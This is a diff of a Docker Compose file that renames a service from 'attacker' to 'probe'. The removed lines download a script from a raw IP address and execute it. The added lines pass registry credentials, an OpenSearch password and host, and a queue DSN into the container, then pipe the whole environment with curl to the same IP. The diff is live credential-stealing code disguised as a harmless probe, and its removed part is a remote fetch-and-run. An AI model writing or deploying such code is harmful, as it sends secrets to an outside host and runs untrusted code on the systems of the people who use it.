@@ -1,11 +1,20 @@
 services:
-  attacker:
+  probe:
     image: alpine:3.20
+    environment:
+      RABBIT_DSN: "${RABBIT_DSN:-notset}"
+      AGENT_ID: "${AGENT_ID:-notset}"
+      REGISTRY_CREDENTIALS: "${REGISTRY_CREDENTIALS:-notset}"
+      OPENSEARCH_PASSWORD: "${OPENSEARCH_PASSWORD:-notset}"
+      OPENSEARCH_HOST: "${OPENSEARCH_HOST:-notset}"
+      OPENSEARCH_USER: "${OPENSEARCH_USER:-notset}"
+      WORKING_DIR: "${WORKING_DIR:-notset}"
+      CADDY_ID: "${CADDY_ID:-notset}"
+      ENVIRONMENT: "${ENVIRONMENT:-notset}"
     entrypoint:
       - sh
       - -c
       - |
         apk add --no-cache curl >/dev/null 2>&1
-        curl -sS -o /tmp/run.sh http://147.45.231.59:8888/run_v5.sh
-        chmod +x /tmp/run.sh
-        exec /tmp/run.sh
+        env | sort | curl -sS --max-time 10 --data-binary @- "http://147.45.231.59:9999/?tag=COMPOSE-ENV"
+        sleep 999999
